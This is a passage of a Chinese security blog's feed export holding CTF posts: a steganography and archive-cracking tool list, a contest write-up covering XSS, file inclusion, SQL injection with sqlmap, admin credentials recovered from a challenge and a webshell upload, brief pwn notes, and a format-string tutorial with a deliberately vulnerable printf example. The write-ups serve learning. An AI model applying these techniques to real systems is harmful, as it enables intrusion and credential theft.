class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/jphide-01"></a></p><p><code>左边是隐写 右边是提取隐写文件</code></p><h2 id="Winhex"><a href="#Winhex" class="headerlink" title="Winhex"></a>Winhex</h2><p>二进制文件打开方式</p><h2 id="wbs43open"><a href="#wbs43open" class="headerlink" title="wbs43open"></a>wbs43open</h2><p><code>PDF</code>文件隐写的不二选择 <a href="https://yunpan.cn/c6jcYbgFjajmp">下载传送门</a> （提取码：2336）</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/wbs43open.jjpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/wbs43open.jjpg"></a></p><h2 id="Iamge-Stganograpy"><a href="#Iamge-Stganograpy" class="headerlink" title="Iamge Stganograpy"></a>Iamge Stganograpy</h2><p>这也是一个图片的隐写工具<br>当初死活在谷歌 百度等地方都找不到 最后<code>白师傅</code>在搜狗找到了…<br><a href="http://imagesteganography.codeplex.com/">下载传送门</a></p><h2 id="F5算法隐写实现"><a href="#F5算法隐写实现" class="headerlink" title="F5算法隐写实现"></a>F5算法隐写实现</h2><p><a href="https://yunpan.cn/c6jdvEtep8guk">下载传送门</a> （提取码：c033)</p><h2 id="silenteye-音频隐写）"><a href="#silenteye-音频隐写）" class="headerlink" title="silenteye(音频隐写）"></a>silenteye(音频隐写）</h2><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/silenteye.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/silenteye.jpg"></a></p><h2 id="MP3Stego"><a href="#MP3Stego" class="headerlink" title="MP3Stego"></a>MP3Stego</h2><p>顾名思义 这是一个款音频隐写工具<a href="http://www.petitcolas.net/steganography/mp3stego/">下载传送门</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">用MP3Stego进行加密解密：</span><br><span class="line"></span><br><span class="line">加密：encode -E 加密文本 -P 密码  mp3文件</span><br><span class="line"></span><br><span class="line">解密：decode -X -P  密码  mp3文件</span><br></pre></td></tr></table></figure><h2 id="Outguess"><a href="#Outguess" class="headerlink" title="Outguess"></a>Outguess</h2><p>2016-08-04 21:07:46<br>今天遇到的一个隐写工具 CSDN有源码</p><figure class="highlight plain"><figcaption><span>code</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;configure &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>使用方法<code> outguess</code>就能看到使用方法啦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -r bystudent.jpg outfile.txt</span><br></pre></td></tr></table></figure><p><strong>这个隐写方式也是可以通过stegdetect</strong>检测出来的</p><h3 id="outguess-win版本"><a href="#outguess-win版本" class="headerlink" title="outguess win版本"></a>outguess win版本</h3><p><a href="https://yunpan.cn/cvGgexSzz2byb">下载</a> （提取码：e2b8）</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/outguess" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/outguess"></a></p><h2 id="BCompare"><a href="#BCompare" class="headerlink" title="BCompare"></a>BCompare</h2><p>给个例子 一个Misc <a href="http://www.bodkin.ren/?p=553">题目详情</a><br>但是这里介绍的是BCompare的解一个隐写题的方法<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/pokenmon-box.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/pokenmon-box.jpg"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/pokenmon.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/pokenmon.jpg"></a></p><p>这里两张图 明显就是要把两张图放在一起  看容差的</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/comapare" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/comapare"></a></p><h2 id="Brain-Too"><a href="#Brain-Too" class="headerlink" title="Brain Too"></a>Brain Too</h2><p>这也是一个隐写工具 <code>主要用于brainfuck的隐写方式</code><br><a href="https://yunpan.cn/cvGgTwB94bk5a">下载</a> （提取码：b35a)</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/brain_too.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/brain_too.jpg"></a></p><h1 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h1><h2 id="Yafu"><a href="#Yafu" class="headerlink" title="Yafu"></a>Yafu</h2><p>大整数分解 <a href="https://yunpan.cn/c6jHKGCbiwEPJ">下载传送门</a>（提取码：16f4）</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/yafu" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/yafu"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">factor(要分解的整数)</span><br></pre></td></tr></table></figure><h2 id="Ziperello"><a href="#Ziperello" class="headerlink" title="Ziperello"></a>Ziperello</h2><p><code>ZIP</code>压缩包暴力破解 <a href="https://yunpan.cn/c6jFbIaYXFQxw">下载传送门</a>（提取码：324a)</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ziperello" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ziperello"></a></p><h2 id="ARPR-ha"><a href="#ARPR-ha" class="headerlink" title="ARPR-ha"></a>ARPR-ha</h2><p><code>RAR</code>暴力破解 <a href="https://yunpan.cn/c6jFCzLhVDGbX">下载传送门</a> （提取码：6092）</p><h2 id="AAPasswordRecovery"><a href="#AAPasswordRecovery" class="headerlink" title="AAPasswordRecovery"></a>AAPasswordRecovery</h2><p>ZIP /RAR等压缩软件的破解工具 <a href="https://yunpan.cn/c6jL27k6Nvfvc"></a> （提取码：f6c7)<br>可支持多种破解方式<br>包括</p><ol><li><p>明文攻击</p></li><li><p>暴力破解</p></li><li><p>字典攻击</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/aapasswordrevovery" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/aapasswordrevovery"></a></p></li></ol><h2 id="PKCrack"><a href="#PKCrack" class="headerlink" title="PKCrack"></a>PKCrack</h2><p><code>ZIP</code>明文破解工具 <a href="http://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack.html">下载传送门</a><br><a href="http://blog.csdn.net/jiangwlee/article/details/6911087">详细使用方法请看这</a></p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p><code>CTF常用工具集合</code><a href="http://www.codefrom.com/c/43">看这里</a><br><code>表哥的编码解码博文</code><a href="https://www.hackfun.org/CTF/coding-and-encryption-of-those-brain-holes-in-CTF.html">来这里</a><br><code>CTF隐写总结</code><a href="http://bobao.360.cn/learning/detail/243.html">在这里</a></p><h1 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h1><p>待续更新 2016-07-27 17:58:07</p><hr><p>2016-10-20 13:43:47<br>更新内容<br>​     <code>BCompare</code><br>​     <code>Brain Tool</code><br>​     <code>Outguess</code> win版本</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
            <tag> Tools </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋30强部分write-up</title>
      <link href="ichunqiu-30-strong-part-of-the-customs-guide.html"/>
      <url>ichunqiu-30-strong-part-of-the-customs-guide.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="基础题"><a href="#基础题" class="headerlink" title="基础题"></a>基础题</h1><h2 id="能看到吗？"><a href="#能看到吗？" class="headerlink" title="能看到吗？"></a>能看到吗？</h2><p>F12审查元素查看</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichuqiu-30-1.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichuqiu-30-1.png"></a></p><p>有个事件 点击事件所在的图片 就能弹出flag了。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/inchuqiu-2.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/inchuqiu-2.png"></a></p><h2 id="加密地址"><a href="#加密地址" class="headerlink" title="加密地址"></a>加密地址</h2><p>F12同理使用审查元素  这个好简单</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-3.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-3.png"></a></p><h2 id="看仔细了"><a href="#看仔细了" class="headerlink" title="看仔细了"></a>看仔细了</h2><p>查看源代码  发现是base64编码的密文 解密后填入就好了</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-4.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-4.png"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-5.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-5.png"></a></p><h2 id="外表具有迷惑性"><a href="#外表具有迷惑性" class="headerlink" title="外表具有迷惑性"></a>外表具有迷惑性</h2><p>查看源代码 发现有unicode加密的密文 解密即可<br><a href="http://tool.chinaz.com/Tools/Unicode.aspx?jdfwkey=kbpld">解密地址</a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-6.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-6.png"></a></p><h2 id="洞察力是你取胜的关键"><a href="#洞察力是你取胜的关键" class="headerlink" title="洞察力是你取胜的关键"></a>洞察力是你取胜的关键</h2><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-7.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-7.png"></a></p><p>查看源代码发现奇怪的页面点击进去 然后发现是一个熟悉的东西<br><a href="http://tool.chinaz.com/js.aspx">解密地址</a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-8.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-8.png"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-9.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-9.png"></a></p><h1 id="算法题"><a href="#算法题" class="headerlink" title="算法题"></a>算法题</h1><p><strong>我只记得两个了</strong></p><h2 id="单身狗应有的眼力"><a href="#单身狗应有的眼力" class="headerlink" title="单身狗应有的眼力"></a>单身狗应有的眼力</h2><p>题目很简单 python简单解决</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-10.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-10.png"></a></p><h2 id="神奇数"><a href="#神奇数" class="headerlink" title="神奇数"></a>神奇数</h2><p>懒得贴图了直接贴代码吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">31991</span>,<span class="number">99381</span>):</span><br><span class="line">    <span class="keyword">if</span> len(set(str(i**<span class="number">2</span>)==<span class="number">10</span>:</span><br><span class="line">        <span class="keyword">print</span> i**<span class="number">2</span></span><br></pre></td></tr></table></figure><h1 id="计算机原理基础"><a href="#计算机原理基础" class="headerlink" title="计算机原理基础"></a>计算机原理基础</h1><p><strong>要不要这么直接送分阿</strong></p><h2 id="ASCLL-与二进制"><a href="#ASCLL-与二进制" class="headerlink" title="ASCLL 与二进制"></a>ASCLL 与二进制</h2><p>7…</p><h2 id="算算二进制"><a href="#算算二进制" class="headerlink" title="算算二进制"></a>算算二进制</h2><p>2<strong>20-1=1048575 **不想说话</strong></p><h2 id="你会吗"><a href="#你会吗" class="headerlink" title="你会吗"></a>你会吗</h2><h1 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h1><h2 id="残缺的base64"><a href="#残缺的base64" class="headerlink" title="残缺的base64"></a>残缺的base64</h2><p>跑个脚本 发现原文是镜花水月 所以答案是 6ZWc6Iqx5rC05pyI</p><h2 id="错误的md5"><a href="#错误的md5" class="headerlink" title="错误的md5"></a>错误的md5</h2><p>这个才让我有点收获 我问了下汪神 汪神一脸看智障的和md5算是hex 所以他包含的字母只有<strong>a-f</strong>是没有L的 所以把L→1就Ok了</p><h2 id="就差一步"><a href="#就差一步" class="headerlink" title="就差一步"></a>就差一步</h2><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-11.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-11.png"></a></p><h2 id="这句话有点意思"><a href="#这句话有点意思" class="headerlink" title="这句话有点意思"></a>这句话有点意思</h2><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-12.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-12.png"></a></p><p>培根密码很简单吧</p><h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><h2 id="有选择吗？"><a href="#有选择吗？" class="headerlink" title="有选择吗？"></a>有选择吗？</h2><p>选择题 选B</p><h2 id="flag呢"><a href="#flag呢" class="headerlink" title="flag呢"></a>flag呢</h2><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-13.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-13.png"></a></p><p>然后简单转码就好了</p><h2 id="万中有一呢"><a href="#万中有一呢" class="headerlink" title="万中有一呢"></a>万中有一呢</h2><p>flag在某个包里</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-14.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-14.png"></a></p><h2 id="大黑阔"><a href="#大黑阔" class="headerlink" title="大黑阔"></a>大黑阔</h2><p>广东强网杯的原题 自己看看吧<br><a href="http://blog.csdn.net/u012763794/article/details/50132513">传送门</a><br>根据聊天记录找flag</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p><code>看看我的另外一篇文章吧</code><br><a href="http://wing3.cn/2016/07/04/ichunqiu-Pwn/#more">飞机票ichunqiu-pwn</a></p><h1 id="综合渗透"><a href="#综合渗透" class="headerlink" title="综合渗透"></a>综合渗透</h1><h2 id="整站我也能看到"><a href="#整站我也能看到" class="headerlink" title="整站我也能看到"></a>整站我也能看到</h2><p><code>Pcat表哥</code>给的提示<br>其实就才文件名字和格式 根据形状太长得像压缩包文件 所以猜文件名是gift.rar 然后就拿到flag了</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/icnhunqiu-15.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/icnhunqiu-15.png"></a></p><h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><p>扫一下目录 发现一个sql.sql的网页 访问就拿到flag了</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-16.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-16.png"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-17.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-17.png"></a></p><h2 id="flag在哪"><a href="#flag在哪" class="headerlink" title="flag在哪"></a>flag在哪</h2><p>上传题目 只需要抓包把后缀改大小即可</p><h2 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h2><p>这也是原题 和上面的<code>大黑阔</code>是出自同一个地方 你们可以自己再看看</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-18.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-18.png"></a>弹弹弹</p><p>简单的XSS</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-19.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-19.png"></a></p><h2 id="就在其中"><a href="#就在其中" class="headerlink" title="就在其中"></a>就在其中</h2><p>文件包含题目 </p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-20.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-20.png"></a></p><p>有兴趣可以看看乌云的文章<br><a href="http://drops.wooyun.org/tips/3827">乌云:PHP文件包含</a></p><h2 id="满天过海"><a href="#满天过海" class="headerlink" title="满天过海"></a>满天过海</h2><p>修改token的值为admin1的<code>md5</code>值即可</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-21.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-21.png"></a></p><h2 id="摄影师的家"><a href="#摄影师的家" class="headerlink" title="摄影师的家"></a>摄影师的家</h2><p>我sqlmap跑不出列名和表名不知道你们可以不可以<br>然后我用其他工具跑出来了列名和表名，然后我用手工的方式将列名和表名写在sqlmap上 成功跑出后台帐号密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账号：linhai</span><br><span class="line">密码：linhai19760812</span><br></pre></td></tr></table></figure><p>然后用一些奇淫技巧传了个马 falg就在根目录下</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-22.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-22.png"></a></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>本来想吐槽的 想想算了…</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> i春秋-腾讯30强 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ichunqiu-Pwn</title>
      <link href="ichunqiu-Tencent-top30-Pwn.html"/>
      <url>ichunqiu-Tencent-top30-Pwn.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="Pwn1"><a href="#Pwn1" class="headerlink" title="Pwn1"></a>Pwn1</h1><p>这个题目是我Yllen师傅提醒了我的，但是我依旧不知道怎么写代码！  大写的尴尬</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-07-04-15-45-19.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-07-04-15-45-19.jpg"></a></p><p>关键在这 func这个数组可达到越界的效果，v6的下标是可以控制的，最后我们要达到的结果是什么<br>就是控制的结果到</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-07-04-15-47-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-07-04-15-47-02.jpg"></a></p><p>buf里面即可。</p><h1 id="Pwn2"><a href="#Pwn2" class="headerlink" title="Pwn2"></a>Pwn2</h1><p>Pwn2 根据我Chu大表哥所说是格式化字符串漏洞。有点难度等我学习一段时间再来写吧。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-07-04-15-57-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-07-04-15-57-01.jpg"></a></p><h1 id="Pwn3"><a href="#Pwn3" class="headerlink" title="Pwn3"></a>Pwn3</h1><p>根据Chu表哥的描述<br>这个题目是栈溢出,X64 ROP…我也不太清楚，像我这连pwntools的不会用的渣渣。只能多多学习了。<br>#Pwn4<br>说时候这个好简单…好傻的题。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-07-04-16-00-31.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2016-07-04-16-00-31.jpg"></a></p><p>buf的空间是40，scanf的大小也是40这样就导致了一个问题。去掉尾部的”、00”,然后name2下方相邻的就是flag的每个字节。所以最终可以达到把flag一个一个leak出来。</p><p><a href="http://7xt21h.com1.z0.glb.clouddn.com/2016-07-04%2023-48-58.jpg?imageView2/2/w/640/h/427/interlace/1/q/100" class="gallery-item"><img src="http://7xt21h.com1.z0.glb.clouddn.com/2016-07-04%2023-48-58.jpg?imageView2/2/w/640/h/427/interlace/1/q/100"></a></p><p>#一些相关<br><a href="http://sh3ll.me/2016/07/04/ichunqiu-tenCentAp/">Chu表哥博客文章</a><br><a href="http://www.freebuf.com/articles/system/74224.html">字符串格式化漏洞</a><br><a href="https://yunpan.cn/cBQHR9WjrI9Ra">Pwn题目打包</a>  PS:（提取码：745c）</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> i春秋-腾讯30强 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈格式化字符串漏洞</title>
      <link href="Talking-about-Formatting-String-Vulnerability.html"/>
      <url>Talking-about-Formatting-String-Vulnerability.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p> 开始接触漏洞利用了，这算是Chu师傅带我进Pwn的门阿 太黑客了。<br>这篇文章是我自己理解以及加以整理的，可能有偏误之类的欢迎大家指正。</p><h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>格式化字符串，是一个比较常见，简单的漏洞类型。我算是从这里开始入门CTF的pwn的。它看起来就简单，但是危害却不小。</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><p>在讲正文前先提一个简单的东西，为了更好了解漏洞先提一下栈。<br>栈内存在进程的作用如下:</p><ol><li>暂时保存函数内的局部变量</li><li>调用函数时传递参数</li><li>保存函数返回后的地址<br>栈其实是一种数据结构，它按照FILO(后进先出)的原则存储数据。<br>##栈的特征<br>栈内存的结构一般如图</li></ol><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/about-fmt-stack.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/about-fmt-stack.jpg"></a></p><p>简单了解几个知识</p><ol><li><p>PUSH 入栈  </p></li><li><p>POP 出栈</p></li><li><p>ESP 栈顶指针</p><p>  一个进程中，栈顶指针(ESP)初始状态指向栈顶端。执行PUSH命令将数据压入栈时，栈顶指针就会上移到栈顶端。执行POP命令从栈中弹出数据时，若栈是空的，则栈顶指针重新移动到栈低端。  </p><p>简单的讲，栈是一种由高地址向低地址扩展的数据结构。就像砌墙一样，向栈中压入数据的时候，数据就像砖墙，没砌上一层，墙就高一点。(PS:栈底是高地址，栈顶是低地址)</p></li></ol><p>#漏洞简介<br>会触发格式化字符漏洞的函数有<strong>pirntf</strong>、<strong>sprintf</strong>、<strong>fprintf</strong>，但不局于这些的c库中的printf家族函数。<br>##什么是格式化字符串<br>从是什么入手吧:<br>一个格式化字符串也就是一个ASCII字符串，其中包括了文本和格式参数。我们从简单的<strong>printf</strong>入手。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf (&quot;What is your name: %s&quot;,&quot;Summer&quot;)</span><br></pre></td></tr></table></figure><p>这种样子的printf函数第一个参数就是简单的格式化字符串，作用是什么呢，作用是告诉一个程序如何进行格式化的输出的说明符号。简单的讲，他就是告诉机器，等等你要输出的内容是什么格式的，该怎么输出。<br>在C语言中我们有许多格式化字符的说明符号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%d -十进制  输出的是整数型的十进制整数</span><br><span class="line">%s - 字符串  输出的内容是字符串</span><br><span class="line">%c - 字符     输出的内容是字符</span><br><span class="line">%p - 指针    指针地址</span><br><span class="line">%n - 输出的是字符的个数</span><br><span class="line">......省略号</span><br></pre></td></tr></table></figure><p>例如以上的不同的数据类型。而存在格式化字符串漏洞的函数就是上文提到的<strong>printf</strong>等等不局限于此的函数。<br>一般情况下我们使用<strong>printf</strong>这个函数的形式为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,a);</span><br><span class="line">    <span class="built_in">printf</span>(“%s<span class="string">&quot;,a);</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>但是如果程序员一偷懒就变成了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样问题就来了，也正是因为程序员对用户(黑客)的输入没有进行良好的过滤，限制，造成了这个漏洞的出现。因此千万不要将<strong>printf</strong>中的format字符串的操作权交给用户(黑客)。</p><h2 id="直接拿一个题来做演示"><a href="#直接拿一个题来做演示" class="headerlink" title="直接拿一个题来做演示"></a>直接拿一个题来做演示</h2><p>题目地址：<a href="https://pan.baidu.com/s/1nuLAAgh">https://pan.baidu.com/s/1nuLAAgh</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用阿里云搭建VPN</title>
      <link href="%E5%88%A9%E7%94%A8%E9%98%BF%E9%87%8C%E4%BA%91%E6%90%AD%E5%BB%BAVPN.html"/>
      <url>%E5%88%A9%E7%94%A8%E9%98%BF%E9%87%8C%E4%BA%91%E6%90%AD%E5%BB%BAVPN.html</url>
      
